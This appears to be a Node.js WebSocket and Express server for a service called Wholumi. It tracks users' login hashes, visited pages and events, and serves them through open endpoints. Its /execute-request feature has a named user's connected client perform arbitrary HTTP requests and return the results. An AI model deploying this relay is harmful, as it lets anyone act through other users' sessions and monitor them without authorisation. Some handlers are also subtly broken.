const WebSocket = require('ws');
const express = require('express');
const cors = require('cors');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 8080;
const WS_PORT = process.env.WS_PORT || 8081;

// Middleware
app.use(cors());
app.use(express.json());

// Serve static files for dashboard
app.use(express.static(path.join(__dirname, 'public')));

// Store for active connections
const clients = new Map();
const rooms = new Map();
const users = new Map(); // Map of username -> user data
const serverLogs = [];
const maxLogs = 1000;

// Logging function
function addServerLog(level, message) {
    const log = {
        timestamp: new Date().toISOString(),
        level: level,
        message: message
    };
    
    serverLogs.push(log);
    
    // Keep only last maxLogs entries
    if (serverLogs.length > maxLogs) {
        serverLogs.splice(0, serverLogs.length - maxLogs);
    }
    
    // Also log to console
    // Also log to console
    const timestamp = new Date().toLocaleTimeString();
    console.log(`[${timestamp}] [${level.toUpperCase()}] ${message}`);
}

// WebSocket Server
const wss = new WebSocket.Server({ port: WS_PORT });

addServerLog('info', `WebSocket server started on port ${WS_PORT}`);

// WebSocket connection handler
wss.on('connection', (ws, req) => {
    const clientId = uuidv4();
    const clientInfo = {
        id: clientId,
        ws: ws,
        rooms: new Set(),
        metadata: {
            userAgent: req.headers['user-agent'],
            connectedAt: new Date(),
            lastActivity: new Date()
        }
    };

    clients.set(clientId, clientInfo);
    addServerLog('info', `Client ${clientId} connected. Total clients: ${clients.size}`);

    // Send welcome message with client ID
    ws.send(JSON.stringify({
        type: 'connection',
        clientId: clientId,
        message: 'Connected to Wholumi WebSocket Server'
    }));

    // Handle incoming messages
    ws.on('message', (data) => {
        try {
            const message = JSON.parse(data.toString());
            handleMessage(clientId, message);
        } catch (error) {
            console.error('Error parsing message:', error);
            ws.send(JSON.stringify({
                type: 'error',
                message: 'Invalid JSON format'
            }));
        }
    });

    // Handle connection close
    ws.on('close', () => {
        handleDisconnect(clientId);
    });

    // Handle connection error
    ws.on('error', (error) => {
        console.error(`WebSocket error for client ${clientId}:`, error);
        handleDisconnect(clientId);
    });

    // Update last activity
    clientInfo.metadata.lastActivity = new Date();
});

// Message handler
function handleMessage(clientId, messageData) {
    const { type, data } = messageData;
    const client = clients.get(clientId);
    
    switch (type) {
        case 'user_identify':
            handleUserIdentify(clientId, data);
            break;
        case 'join_room':
            handleJoinRoom(clientId, data?.room);
            break;
        case 'leave_room':
            handleLeaveRoom(clientId, data?.room);
            break;
        case 'user_event':
            handleUserEvent(clientId, data?.eventType, data?.data || data);
            break;
        case 'request_event':
            handleRequestEvent(clientId, data);
            break;
        case 'boost_event':
            handleBoostEvent(clientId, data);
            break;
        case 'trade_event':
            handleTradeEvent(clientId, data);
            break;
        case 'config_update':
            handleConfigUpdate(clientId, data);
            break;
        case 'broadcast_to_room':
            handleBroadcastToRoom(clientId, data);
            break;
        case 'execute_request':
            handleExecuteRequest(clientId, data);
            break;
        case 'request_response':
            handleRequestResponse(clientId, data);
            break;
        default:
            addServerLog('warn', `Unknown message type: ${type} from client ${clientId}`);
    }
}

// Room management
function joinRoom(clientId, roomName) {
    const client = clients.get(clientId);
    if (!client) return;

    if (!rooms.has(roomName)) {
        rooms.set(roomName, new Set());
    }

    rooms.get(roomName).add(clientId);
    client.rooms.add(roomName);

    client.ws.send(JSON.stringify({
        type: 'room_joined',
        room: roomName,
        message: `Joined room: ${roomName}`
    }));

    // Notify other clients in the room
    broadcastToRoom(roomName, {
        type: 'user_joined',
        clientId: clientId,
        room: roomName
    }, clientId);

    console.log(`Client ${clientId} joined room: ${roomName}`);
}

function leaveRoom(clientId, roomName) {
    const client = clients.get(clientId);
    if (!client) return;

    if (rooms.has(roomName)) {
        rooms.get(roomName).delete(clientId);
        if (rooms.get(roomName).size === 0) {
            rooms.delete(roomName);
        }
    }

    client.rooms.delete(roomName);

    client.ws.send(JSON.stringify({
        type: 'room_left',
        room: roomName,
        message: `Left room: ${roomName}`
    }));

    // Notify other clients in the room
    broadcastToRoom(roomName, {
        type: 'user_left',
        clientId: clientId,
        room: roomName
    }, clientId);

    console.log(`Client ${clientId} left room: ${roomName}`);
}

function broadcastToRoom(roomName, data, excludeClientId = null) {
    if (!rooms.has(roomName)) return;

    const message = JSON.stringify({
        type: 'room_broadcast',
        room: roomName,
        data: data,
        timestamp: Date.now()
    });

    rooms.get(roomName).forEach(clientId => {
        if (clientId !== excludeClientId) {
            const client = clients.get(clientId);
            if (client && client.ws.readyState === WebSocket.OPEN) {
                client.ws.send(message);
            }
        }
    });
}

function sendPrivateMessage(fromClientId, toClientId, data) {
    const fromClient = clients.get(fromClientId);
    const toClient = clients.get(toClientId);

    if (!fromClient || !toClient) {
        fromClient?.ws.send(JSON.stringify({
            type: 'error',
            message: 'Target client not found'
        }));
        return;
    }

    const message = JSON.stringify({
        type: 'private_message',
        from: fromClientId,
        data: data,
        timestamp: Date.now()
    });

    if (toClient.ws.readyState === WebSocket.OPEN) {
        toClient.ws.send(message);
    }

    // Send confirmation to sender
    fromClient.ws.send(JSON.stringify({
        type: 'message_sent',
        to: toClientId,
        data: data
    }));
}

// User management functions
function handleUserIdentify(clientId, userInfo) {
    const client = clients.get(clientId);
    if (!client) return;

    // Check if userInfo is valid
    if (!userInfo || typeof userInfo !== 'object') {
        addServerLog('warn', `Invalid userInfo received from client ${clientId}`);
        return;
    }

    const username = userInfo.username || 'anonymous';
    
    // Update client with user info
    client.userInfo = userInfo;
    client.username = username;
    
    // Update or create user record
    if (!users.has(username)) {
        users.set(username, {
            username: username,
            loginHash: userInfo.loginHash,
            clients: new Set(),
            sessions: [],
            firstSeen: new Date(),
            lastSeen: new Date(),
            totalEvents: 0,
            pages: new Set()
        });
    }
    
    const user = users.get(username);
    user.clients.add(clientId);
    user.lastSeen = new Date();
    user.pages.add(userInfo.url);
    
    // Add session info
    user.sessions.push({
        clientId: clientId,
        startTime: new Date(),
        userAgent: userInfo.userAgent,
        initialUrl: userInfo.url,
        events: []
    });
    
    addServerLog('info', `User identified: ${username} (${clientId})`);
    
    // Notify about user connection
    broadcastToRoom('general', {
        type: 'user_connected',
        username: username,
        clientId: clientId,
        userInfo: userInfo
    });
}

function handleJoinRoom(clientId, roomName) {
    const client = clients.get(clientId);
    if (!client) return;

    // Create room if it doesn't exist
    if (!rooms.has(roomName)) {
        rooms.set(roomName, new Set());
    }

    // Add client to room
    rooms.get(roomName).add(clientId);
    client.rooms.add(roomName);

    // Send confirmation
    client.ws.send(JSON.stringify({
        type: 'room_joined',
        room: roomName,
        message: `Joined room: ${roomName}`
    }));

    addServerLog('info', `Client ${clientId} joined room: ${roomName}`);
}

function handleLeaveRoom(clientId, roomName) {
    const client = clients.get(clientId);
    if (!client) return;

    // Remove client from room
    if (rooms.has(roomName)) {
        rooms.get(roomName).delete(clientId);
        
        // Remove room if empty
        if (rooms.get(roomName).size === 0) {
            rooms.delete(roomName);
        }
    }

    client.rooms.delete(roomName);

    // Send confirmation
    client.ws.send(JSON.stringify({
        type: 'room_left',
        room: roomName,
        message: `Left room: ${roomName}`
    }));

    addServerLog('info', `Client ${clientId} left room: ${roomName}`);
}

function handleUserEvent(clientId, eventType, data) {
    const client = clients.get(clientId);
    if (!client || !client.username) return;
    
    const user = users.get(client.username);
    if (!user) return;
    
    const event = {
        type: eventType,
        data: data,
        timestamp: new Date(),
        clientId: clientId
    };
    
    // Find current session and add event
    const currentSession = user.sessions.find(s => s.clientId === clientId);
    if (currentSession) {
        currentSession.events.push(event);
    }
    
    user.totalEvents++;
    user.lastSeen = new Date();
    
    if (data.url) {
        user.pages.add(data.url);
    }
    
    addServerLog('debug', `User event from ${client.username}: ${eventType}`);
    
    // Broadcast user activity to monitoring room
    broadcastToRoom('user_monitoring', {
        type: 'user_activity',
        username: client.username,
        clientId: clientId,
        eventType: eventType,
        data: data,
        timestamp: event.timestamp
    });
}

function handleRequestEvent(clientId, method, url, data) {
    const client = clients.get(clientId);
    if (!client || !client.username) return;
    
    const user = users.get(client.username);
    if (!user) return;
    
    const requestEvent = {
        type: 'request',
        method: method,
        url: url,
        data: data,
        timestamp: new Date(),
        clientId: clientId
    };
    
    // Find current session and add request
    const currentSession = user.sessions.find(s => s.clientId === clientId);
    if (currentSession) {
        currentSession.events.push(requestEvent);
    }
    
    user.totalEvents++;
    user.lastSeen = new Date();
    
    addServerLog('debug', `Request from ${client.username}: ${method} ${url}`);
    
    // Broadcast request activity to monitoring room
    broadcastToRoom('user_monitoring', {
        type: 'user_request',
        username: client.username,
        clientId: clientId,
        method: method,
        url: url,
        data: data,
        timestamp: requestEvent.timestamp
    });
}

// Wholumi specific event handlers
function handleBoostEvent(clientId, data) {
    addServerLog('info', `Boost event from ${clientId}: ${data.action || 'unknown'}`);
    
    // Broadcast to all clients in 'boost' room
    broadcastToRoom('boost', {
        type: 'boost_event',
        clientId: clientId,
        ...data
    }, clientId);
}

function handleTradeEvent(clientId, data) {
    addServerLog('info', `Trade event from ${clientId}: ${data.action || 'unknown'}`);
    
    // Broadcast to all clients in 'trade' room
    broadcastToRoom('trade', {
        type: 'trade_event',
        clientId: clientId,
        ...data
    }, clientId);
}

function handleConfigUpdate(clientId, data) {
    addServerLog('info', `Config update from ${clientId}: ${data.key || 'unknown'}`);
    
    // Broadcast to all clients in 'config' room
    broadcastToRoom('config', {
        type: 'config_update',
        clientId: clientId,
        ...data
    }, clientId);
}

function handleBroadcastToRoom(clientId, data) {
    const { room, message } = data;
    
    if (!room || !message) {
        addServerLog('warn', `Invalid broadcast request from ${clientId}: missing room or message`);
        return;
    }
    
    addServerLog('info', `Broadcast to room ${room} from ${clientId}: ${message.substring(0, 50)}...`);
    
    // Broadcast to specified room
    broadcastToRoom(room, {
        type: 'room_broadcast',
        room: room,
        message: message,
        from: clientId,
        timestamp: new Date().toISOString()
    }, clientId);
}

function handleExecuteRequest(clientId, data) {
    const { targetUser, method, url, headers, body, requestId } = data;
    
    addServerLog('info', `Execute request from ${clientId} for user ${targetUser}: ${method} ${url}`);
    
    // Find target user's active clients
    if (!users.has(targetUser)) {
        // Send error response
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'request_response',
                requestId: requestId,
                success: false,
                error: 'Target user not found or offline'
            }));
        }
        return;
    }
    
    const user = users.get(targetUser);
    const activeClients = Array.from(user.clients);
    
    if (activeClients.length === 0) {
        // Send error response
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'request_response',
                requestId: requestId,
                success: false,
                error: 'Target user has no active connections'
            }));
        }
        return;
    }
    
    // Send request to the first active client of the target user
    const targetClientId = activeClients[0];
    const targetClient = clients.get(targetClientId);
    
    if (targetClient && targetClient.ws.readyState === WebSocket.OPEN) {
        targetClient.ws.send(JSON.stringify({
            type: 'execute_request',
            requestId: requestId,
            method: method,
            url: url,
            headers: headers,
            body: body,
            requesterClientId: clientId
        }));
        
        addServerLog('info', `Request forwarded to client ${targetClientId} for user ${targetUser}`);
    } else {
        // Send error response
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'request_response',
                requestId: requestId,
                success: false,
                error: 'Target user client is not available'
            }));
        }
    }
}

function handleRequestResponse(clientId, data) {
    // Handle nested data structure
    const responseData = data.data || data;
    const { requestId, success, response, error, statusCode, headers } = responseData;
    
    addServerLog('info', `Request response from ${clientId}: ${requestId} - ${success ? 'SUCCESS' : 'ERROR'}`);
    
    // If this was an API request, we don't need to forward to another client
    if (global.pendingRequests && global.pendingRequests.has(requestId)) {
        const request = global.pendingRequests.get(requestId);
        request.resolved = true;
        request.response = {
            success: success,
            response: response,
            error: error,
            statusCode: statusCode,
            headers: headers,
            completedAt: new Date()
        };
        
        // Keep the response for a short time for potential retrieval
        setTimeout(() => {
            if (global.pendingRequests.has(requestId)) {
                global.pendingRequests.delete(requestId);
            }
        }, 60000); // Keep for 1 minute
        
        return;
    }
    
    // Find the original requester client
    const client = clients.get(clientId);
    if (!client || !client.metadata.lastRequestId) {
        addServerLog('warn', `No requester found for response ${requestId}`);
        return;
    }
    
    // Forward response to the original requester
    const requesterClient = clients.get(client.metadata.lastRequestId);
    if (requesterClient && requesterClient.ws.readyState === WebSocket.OPEN) {
        requesterClient.ws.send(JSON.stringify({
            type: 'request_response',
            requestId: requestId,
            success: success,
            response: response,
            error: error,
            statusCode: statusCode,
            headers: headers
        }));
    }
}

function handleDisconnect(clientId) {
    const client = clients.get(clientId);
    if (!client) return;

    // Remove from user tracking
    if (client.username && users.has(client.username)) {
        const user = users.get(client.username);
        user.clients.delete(clientId);
        user.lastSeen = new Date();
        
        // End current session
        const currentSession = user.sessions.find(s => s.clientId === clientId);
        if (currentSession) {
            currentSession.endTime = new Date();
        }
        
        // Remove user record if no active clients
        if (user.clients.size === 0) {
            addServerLog('info', `User ${client.username} went offline`);
            
            // Notify about user disconnection
            broadcastToRoom('general', {
                type: 'user_disconnected',
                username: client.username,
                clientId: clientId
            });
        }
    }

    // Remove from all rooms
    client.rooms.forEach(roomName => {
        if (rooms.has(roomName)) {
            rooms.get(roomName).delete(clientId);
            if (rooms.get(roomName).size === 0) {
                rooms.delete(roomName);
            }
            // Notify other clients in the room
            broadcastToRoom(roomName, {
                type: 'user_disconnected',
                clientId: clientId,
                room: roomName
            }, clientId);
        }
    });

    clients.delete(clientId);
    addServerLog('info', `Client ${clientId} disconnected. Total clients: ${clients.size}`);
}

// HTTP API endpoints
app.get('/status', (req, res) => {
    res.json({
        status: 'running',
        clients: clients.size,
        rooms: Array.from(rooms.keys()).map(room => ({
            name: room,
            clients: rooms.get(room).size
        })),
        uptime: process.uptime()
    });
});

app.get('/clients', (req, res) => {
    const clientsList = Array.from(clients.values()).map(client => ({
        id: client.id,
        rooms: Array.from(client.rooms),
        metadata: client.metadata
    }));
    res.json(clientsList);
});

app.get('/logs', (req, res) => {
    res.json(serverLogs);
});

app.get('/users', (req, res) => {
    const usersList = Array.from(users.values()).map(user => ({
        username: user.username,
        loginHash: user.loginHash,
        clientsCount: user.clients.size,
        totalEvents: user.totalEvents,
        pagesVisited: Array.from(user.pages),
        firstSeen: user.firstSeen,
        lastSeen: user.lastSeen,
        isOnline: user.clients.size > 0
    }));
    res.json(usersList);
});

app.get('/users/:username', (req, res) => {
    const username = req.params.username;
    const user = users.get(username);
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    const userDetails = {
        username: user.username,
        loginHash: user.loginHash,
        clients: Array.from(user.clients),
        totalEvents: user.totalEvents,
        pagesVisited: Array.from(user.pages),
        firstSeen: user.firstSeen,
        lastSeen: user.lastSeen,
        isOnline: user.clients.size > 0,
        sessions: user.sessions.map(session => ({
            clientId: session.clientId,
            startTime: session.startTime,
            userAgent: session.userAgent,
            initialUrl: session.initialUrl,
            eventsCount: session.events.length,
            recentEvents: session.events.slice(-20) // Last 20 events
        }))
    };
    
    res.json(userDetails);
});

app.get('/users/:username/events', (req, res) => {
    const username = req.params.username;
    const user = users.get(username);
    
    if (!user) {
        return res.status(404).json({ error: 'User not found' });
    }
    
    const allEvents = [];
    user.sessions.forEach(session => {
        allEvents.push(...session.events);
    });
    
    // Sort by timestamp and limit
    const limit = parseInt(req.query.limit) || 100;
    const sortedEvents = allEvents
        .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
        .slice(0, limit);
    
    res.json(sortedEvents);
});

app.post('/broadcast', (req, res) => {
    const { room, data } = req.body;
    
    if (!room || !data) {
        return res.status(400).json({ error: 'Room and data are required' });
    }

    broadcastToRoom(room, data);
    res.json({ success: true, message: `Broadcasted to room: ${room}` });
});

// Execute request on behalf of user
app.post('/execute-request', (req, res) => {
    const { targetUser, method, url, headers, body } = req.body;
    
    if (!targetUser || !method || !url) {
        return res.status(400).json({ 
            success: false, 
            error: 'Missing required fields: targetUser, method, url' 
        });
    }
    
    const requestId = uuidv4();
    
    // Store pending request for response tracking
    const pendingRequest = {
        requestId: requestId,
        targetUser: targetUser,
        method: method,
        url: url,
        headers: headers,
        body: body,
        timestamp: new Date(),
        resolved: false
    };
    
    // Store in a temporary map for response handling
    if (!global.pendingRequests) {
        global.pendingRequests = new Map();
    }
    global.pendingRequests.set(requestId, pendingRequest);
    
    // Set timeout for request
    setTimeout(() => {
        if (global.pendingRequests.has(requestId)) {
            const request = global.pendingRequests.get(requestId);
            if (!request.resolved) {
                global.pendingRequests.delete(requestId);
                addServerLog('warn', `Request ${requestId} for user ${targetUser} timed out`);
            }
        }
    }, 30000); // 30 second timeout
    
    // Find target user's active clients
    if (!users.has(targetUser)) {
        global.pendingRequests.delete(requestId);
        return res.status(404).json({
            success: false,
            error: 'Target user not found or offline'
        });
    }
    
    const user = users.get(targetUser);
    const activeClients = Array.from(user.clients);
    
    if (activeClients.length === 0) {
        global.pendingRequests.delete(requestId);
        return res.status(404).json({
            success: false,
            error: 'Target user has no active connections'
        });
    }
    
    // Send request to the first active client of the target user
    const targetClientId = activeClients[0];
    const targetClient = clients.get(targetClientId);
    
    if (targetClient && targetClient.ws.readyState === WebSocket.OPEN) {
        targetClient.ws.send(JSON.stringify({
            type: 'execute_request',
            requestId: requestId,
            method: method,
            url: url,
            headers: headers,
            body: body,
            apiRequest: true
        }));
        
        addServerLog('info', `API request ${requestId} forwarded to client ${targetClientId} for user ${targetUser}: ${method} ${url}`);
        
        res.json({
            success: true,
            requestId: requestId,
            message: `Request forwarded to user ${targetUser}`,
            targetClient: targetClientId
        });
    } else {
        global.pendingRequests.delete(requestId);
        res.status(503).json({
            success: false,
            error: 'Target user client is not available'
        });
    }
});

// Get request result
app.get('/request-result/:requestId', (req, res) => {
    const requestId = req.params.requestId;
    
    if (!global.pendingRequests || !global.pendingRequests.has(requestId)) {
        return res.status(404).json({
            success: false,
            error: 'Request not found or expired'
        });
    }
    
    const request = global.pendingRequests.get(requestId);
    
    if (!request.resolved) {
        return res.json({
            success: true,
            status: 'pending',
            message: 'Request is still being processed',
            requestId: requestId,
            timestamp: request.timestamp
        });
    }
    
    // Return the response
    res.json({
        success: true,
        status: 'completed',
        requestId: requestId,
        result: request.response,
        timestamp: request.timestamp,
        completedAt: request.response.completedAt
    });
});

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'healthy', timestamp: new Date() });
});

// Cleanup inactive connections
setInterval(() => {
    const now = new Date();
    const timeout = 5 * 60 * 1000; // 5 minutes

    clients.forEach((client, clientId) => {
        if (now - client.metadata.lastActivity > timeout) {
            console.log(`Cleaning up inactive client: ${clientId}`);
            if (client.ws.readyState === WebSocket.OPEN) {
                client.ws.close();
            }
            handleDisconnect(clientId);
        }
    });
}, 60000); // Check every minute

// Start HTTP server
app.listen(PORT, () => {
    console.log(`HTTP server started on port ${PORT}`);
    console.log(`WebSocket server running on port ${WS_PORT}`);
    console.log('Wholumi WebSocket Server is ready!');
});

// Graceful shutdown
process.on('SIGTERM', () => {
    console.log('Shutting down gracefully...');
    wss.clients.forEach(ws => {
        ws.close();
    });
    process.exit(0);
});

process.on('SIGINT', () => {
    console.log('Shutting down gracefully...');
    wss.clients.forEach(ws => {
        ws.close();
    });
    process.exit(0);
});
